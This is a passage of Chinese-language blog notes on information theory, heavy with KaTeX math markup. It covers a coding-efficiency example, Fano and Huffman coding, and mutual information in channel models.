style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2</span></span></span><span style="top:-7.3802em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2.4233</span><span class="mopen">(</span><span class="mord"><span class="mord mathrm">bit</span></span><span class="mord">/</span><span class="mord"><span class="mord mathrm">sign</span></span><span class="mclose">)</span></span></span><span style="top:-4.9191em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"><span class="mord"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.8033em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2.7</span></span></span><span style="top:-1.7811em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">L</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.8033em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2.7</span></span></span><span style="top:0.6319em;"><span class="pstrut" style="height:3.8011em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathrm">X</span><span class="mclose">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">89.63%</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4191em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h2 id="费诺编码">费诺编码</h2><p>首先从大到小排队，然后把符号分成 2 组，要求这是所有分成 2 组的情况中，每组概率之和相差最小的情况。然后随意给两组其中一个分配 0，另一个分配 1。每组内部继续按照上面的规则分组和编码。</p><img src="https://cdn.blog-blockchain.xyz/202305222356113.png" alt="image-20230522235645973" style="zoom: 33%;" /><h2 id="赫夫曼编码">赫夫曼编码</h2><p>首先从大到小排队，对于符号的概率的 n 种取值，开始构造二叉树，节点是最小的 2 个符号，父节点是他们的和。然后用父节点替代它们，变成 n-1 个符号，去除了之前两个概率最小的符号的概率，增加了一个父节点的概率。重复这个过程，直到只剩下 1 个符号。</p><p>下面的序号是代表合并的步骤。</p><p><img src="https://cdn.blog-blockchain.xyz/202305230029109.jpg" alt="qq_pic_merged_1684772949686"></p><h1>信道容量</h1><h2 id="信道模型">信道模型</h2><p>信道容量（channel capacity）则是指一个信道在特定条件下（例如，特定的信噪比）能够传输的最大信息速率，反映了在单位时间内能够通过信道传输的最大信息量。这里我们不考虑两个信源之间的具体转换关系，而是考虑**两个随机变量之间的信息共享量，或者说，一个随机变量中包含的关于另一个随机变量的信息量。这就是互信息量。**它也可以衡量特征和目标变量之间的相关性。</p><img src="https://cdn.blog-blockchain.xyz/202305241121774.png" alt="image-20230524112132704" style="zoom:50%;" /><p>直观地讲，如果 X 和 Y 是独立的，那么他们的互信息就是 0，因为知道 X 的值并不能给我们提供关于 Y 的任何信息，反之亦然。另一方面，如果 X 和 Y 完全相关（也就是说，如果我们知道了 X 的值，那么我们就可以确定 Y 的值），那么他们的互信息量就等于 X（或 Y）的熵。</p><p>总之，X 和 Y 之间的互信息量或者说相关性，来自信息的传递，如果没有信息从信道传递，那么就是相互独立的。</p><h2 id="互信息量">互信息量</h2><p>两个随机变量的某个取值，来自 Y 的取值 b 对来自 X 的取值 a 的<strong>互信息量</strong>，也就是<strong>在已知事件 b 发生后，对事件 a 的不确定性减少的程度</strong>，</p><p>定义如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>b</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>log</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">I\left( a;b \right) =\log \frac{p\left( a|b \right)}{p\left( a \right)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>这个定义体现了<strong>通过信宿 Y 的值 b 来推测信源 X 的值 a，与实际信源 X 的值 a 的概率的比值</strong>，也是<strong>这一次传输的信息量</strong>。如果事件 b 发生了，那么我们对事件 a 的预测可能会更准确一些，也就是说，事件 a 的不确定性可能会降低。而造成这种不确定性的减少的原因，就是信源 X 通过信道传递信息到了信宿 Y。</p><p>从自信息量的角度，也可以验证刚才对互信息量的解释。因为在信息传递之前，信源 X 和信宿 Y 是独立的，只有信息传输之后，才会有共享的信息。传递的部分就是信源 X 的信息量，减去从信宿 Y 获取观察信源 X 的信息量：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">;</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>+</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>−</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left(a_i ; b_j\right)=-\log p\left(a_i\right)+\log p\left(a_i / b_j\right)=I\left(a_i\right)-I\left(a_i / b_j\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>如果从信息共享（也就是信息传递）的角度看，更加直观的形式如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo separator="true">;</mo><mi>b</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><mi>b</mi><mo separator="true">;</mo><mi>a</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>log</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><mi>a</mi><mi>b</mi><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><mi>a</mi><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><mi>b</mi><mo fence="true">)</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">I\left( a;b \right) =I\left( b;a \right) =\log \frac{p\left( ab \right)}{p\left( a \right) p\left( b \right)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">ab</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>通过简单变形，就有了最开始互信息量的定义，它给我们提供了一种，不知道 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span> 但是知道 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(a|b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span> 的情况下的计算方法。</p><p>对于两个信源而言，<strong>平均互信息量</strong>就是所有组合的互信息量的平均值：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>log</mi><mo>⁡</mo><mfrac><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mfrac></mrow></mrow></mrow><annotation encoding="application/x-tex">I\left( X;Y \right) =\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_ib_j \right) \log \frac{p\left( a_ib_j \right)}{p\left( a_i \right) p\left( b_j \right)}}}=\sum_{i=1}^n{\sum_{j=1}^m{p\left( a_ib_j \right) \log \frac{p\left( a_i|b_j \right)}{p\left( a_i \right)}}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.0652em;vertical-align:-1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span 